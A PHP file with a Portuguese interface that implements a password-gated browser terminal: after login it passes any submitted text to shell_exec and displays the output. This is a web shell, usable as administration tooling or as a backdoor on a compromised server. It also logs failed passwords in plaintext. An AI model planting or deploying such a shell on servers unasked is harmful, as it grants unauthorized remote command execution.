<?php
// -- CONFIGURAÇÃO DE SEGURANÇA --
define('PASSWORD_HASH', '$2y$10$GkEp1.N.1PnVud24USQcBOfLHwITenNAoeTYJgxsRcf40zLcujkMe');
define('LOG_FILE', 'tentativas_login.log');


session_start();

function get_ip_address() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// -- LÓGICA DE AUTENTICAÇÃO --
if (isset($_POST['password'])) {
    // SE A SENHA ESTIVER CORRETA
    if (password_verify($_POST['password'], PASSWORD_HASH)) {
        
        // -- NOVO: LÓGICA DE LOG DE SUCESSO --
        $ip_address = get_ip_address();
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
        $timestamp = date('Y-m-d H:i:s');
        $log_message = "[$timestamp] - Login BEM-SUCEDIDO - IP: $ip_address - User-Agent: $user_agent" . PHP_EOL;
        file_put_contents(LOG_FILE, $log_message, FILE_APPEND | LOCK_EX);
        // -- FIM DA LÓGICA DE LOG --

        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;

    // SE A SENHA ESTIVER INCORRETA
    } else {
        $login_error = "Senha incorreta!";
        
        $ip_address = get_ip_address();
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'N/A';
        $timestamp = date('Y-m-d H:i:s');
        $submitted_password = $_POST['password'];

        $log_message = "[$timestamp] - Tentativa de login falhou - IP: $ip_address - Senha Tentada: '$submitted_password' - User-Agent: $user_agent" . PHP_EOL;
        file_put_contents(LOG_FILE, $log_message, FILE_APPEND | LOCK_EX);
    }
}

// -- LÓGICA DE EXECUÇÃO DE COMANDOS (só se estiver autenticado) --
if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']) {
    if (isset($_POST['command'])) {
        $command = $_POST['command'];

        if ($command === 'logout') {
            session_destroy();
            echo "LOGGED_OUT";
            exit;
        }

        if (!isset($_SESSION['cwd'])) { $_SESSION['cwd'] = getcwd(); }
        chdir($_SESSION['cwd']);
        
        if (preg_match('/^cd\s*(.*)$/', $command, $matches)) {
            $newDir = trim($matches[1]);
            if (empty($newDir)) {
                $home = getenv('HOME');
                if ($home && @chdir($home)) { $_SESSION['cwd'] = getcwd(); }
            } elseif (@chdir($newDir)) {
                $_SESSION['cwd'] = getcwd();
            } else {
                echo "bash: cd: " . htmlspecialchars($newDir) . ": No such file or directory\n";
            }
        } else {
            $output = shell_exec($command . ' 2>&1');
            if (empty($output)) { $output = "\n"; } 
            elseif (substr($output, -1) !== "\n") { $output .= "\n"; }
            echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
        }
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Secure Terminal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --background: #0d0208; --foreground: #00ff41; --cyan: #00ffff;
            --magenta: #ff00ff; --blue: #00BFFF; --white: #f8f8f8;
            --error: #ff4141; --font: 'Fira Code', monospace;
        }
        html, body { background-color: var(--background); height: 100%; margin: 0; font-family: var(--font); color: var(--white); }
        .login-wrapper { display: flex; align-items: center; justify-content: center; height: 100%; }
        .login-box { background-color: #1a1a1a; padding: 40px; border: 1px solid var(--magenta); box-shadow: 0 0 15px var(--magenta); text-align: center; }
        .login-box h2 { color: var(--cyan); margin-top: 0; }
        .login-box input { background: #333; border: 1px solid #555; color: var(--white); padding: 10px; width: 250px; }
        .login-box button { background: var(--magenta); border: none; color: var(--white); padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        .login-box .error { color: var(--error); margin-top: 15px; }
        #terminal { display: none; padding: 15px; height: 100%; box-sizing: border-box; overflow-y: auto; word-wrap: break-word; }
        #terminal:focus-within .cursor { animation: blink 1s step-end infinite; }
        .line { white-space: pre-wrap; color: var(--foreground); }
        .prompt-line { display: flex; align-items: center; }
        .prompt-user { color: var(--cyan); font-weight: bold; }
        .prompt-at, .prompt-colon, .prompt-dollar { color: var(--white); }
        .prompt-host { color: var(--magenta); }
        .prompt-path { color: var(--blue); }
        .prompt-dollar { margin-right: 8px; }
        .command-input { background: transparent; border: none; color: var(--foreground); font-family: inherit; font-size: inherit; flex-grow: 1; padding: 0; }
        .command-input:focus { outline: none; }
        .command-echo { color: var(--white); }
        .system-message { color: var(--magenta); }
        .error-message { color: var(--error); }
        .cursor { background-color: var(--foreground); width: 9px; height: 1.2em; display: inline-block; vertical-align: middle; }
        @keyframes blink { 50% { opacity: 0; } }
        /* Scrollbar */
        ::-webkit-scrollbar { width: 10px; } ::-webkit-scrollbar-track { background: #222; }
        ::-webkit-scrollbar-thumb { background: var(--cyan); border-radius: 5px; } ::-webkit-scrollbar-thumb:hover { background: var(--magenta); }
    </style>
</head>
<body>
    <?php if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']): ?>
        <div class="login-wrapper">
            <div class="login-box">
                <h2>Acesso ao Terminal</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Digite sua senha" autofocus>
                    <br>
                    <button type="submit">Entrar</button>
                </form>
                <?php if (isset($login_error)): ?>
                    <p class="error"><?php echo $login_error; ?></p>
                <?php endif; ?>
            </div>
        </div>
    <?php else: ?>
        <div id="terminal" style="display: block;"></div>
        <script>
            // Todo o JavaScript do terminal entra aqui.
            const terminal = document.getElementById('terminal');
            const welcomeMessage = `<div class="line">Login bem-sucedido. Sessão iniciada.</div>
<div class="line system-message">AVISO: Esta ferramenta concede acesso ao servidor. Use com responsabilidade.</div>
<div class="line">Digite <span class="command-echo">'help'</span> para comandos ou <span class="command-echo">'logout'</span> para sair.</div>`;

            async function handleCommand(command, promptLine) {
                const promptText = promptLine.querySelector('.prompt-text-wrapper').innerHTML;
                promptLine.innerHTML = `${promptText}<span class="command-echo">${escapeHtml(command)}</span>`;
                
                if (command.toLowerCase() === 'clear') {
                    terminal.innerHTML = '';
                } else if (command.toLowerCase() === 'help') {
                     const helpText = `\n<div class="line">Comandos Especiais:</div>
<div class="line">  <span class="command-echo">help</span>      Mostra esta mensagem.</div>
<div class="line">  <span class="command-echo">clear</span>     Limpa a tela.</div>
<div class="line">  <span class="command-echo">logout</span>    Encerra a sessão e sai.</div>\n`;
                    terminal.insertAdjacentHTML('beforeend', helpText);
                } else {
                    const response = await sendCommand(command);
                    if (response === "LOGGED_OUT") {
                        window.location.reload();
                        return;
                    }
                    const result = document.createElement('div');
                    result.className = 'line';
                    if (response.includes("No such file or directory") || response.includes("command not found")) {
                        result.classList.add('error-message');
                    }
                    result.textContent = response;
                    terminal.appendChild(result);
                }
                await createNewPromptLine();
            }

            async function createNewPromptLine() {
                const promptLine = document.createElement('div');
                promptLine.className = 'prompt-line';
                promptLine.innerHTML = `<div class="prompt-text-wrapper"></div><input type="text" class="command-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"><div class="cursor"></div>`;
                terminal.appendChild(promptLine);
                const commandInput = promptLine.querySelector('.command-input');
                commandInput.focus();
                commandInput.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        this.disabled = true;
                        handleCommand(this.value.trim(), this.parentElement);
                    }
                });
                await updatePrompt(promptLine);
            }
            
            async function updatePrompt(promptLine) {
                const user = (await sendCommand('whoami')).trim();
                const path = (await sendCommand('pwd')).trim();
                const promptTextWrapper = promptLine.querySelector('.prompt-text-wrapper');
                promptTextWrapper.innerHTML = `<span class="prompt-user">${user}</span><span class="prompt-at">@</span><span class="prompt-host">localhost</span><span class="prompt-colon">:</span><span class="prompt-path">${path}</span><span class="prompt-dollar">$</span>`;
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            async function sendCommand(command) {
                const formData = new FormData();
                formData.append('command', command);
                const response = await fetch(window.location.href, { method: 'POST', body: formData });
                return await response.text();
            }

            function escapeHtml(text) {
                const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'};
                return text.replace(/[&<>"']/g, m => map[m]);
            }
            
            function init() {
                terminal.innerHTML = welcomeMessage;
                createNewPromptLine();
            }

            init();
        </script>
    <?php endif; ?>
</body>
</html>